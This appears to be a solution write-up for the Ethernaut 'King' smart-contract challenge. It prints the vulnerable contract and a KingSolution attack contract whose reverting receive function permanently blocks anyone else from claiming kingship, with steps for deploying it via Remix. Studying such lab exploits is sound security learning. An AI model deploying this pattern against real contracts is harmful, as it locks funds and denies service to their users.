[9 - King](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)

Solution: 
* we first need to take kingship of the contract, and the king should be a contract with a receive function that reverts
* that way, noone can ever claim kingship back, since the payable(king).transfer(msg.value) will always revert
```
fromWei(await contract.prize()); // shows us current prize is 0.001 ETH
```
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingSolution {
  address payable private constant kingAddress = payable(0xf9E3E068c276d261B511a8fa0A7667fe12387bde);

  receive() external payable {
    revert();
  }

  function solve() external payable {
    (bool sent, ) = kingAddress.call{value: msg.value}("");
    require(sent, "Failed to send msg.value.");
  }
}
```
From Remix, deploy KingSolution, and call solve with 0.002 ETH, so KingSolution becomes King.
await contract._king(); // to check king switched

```

```
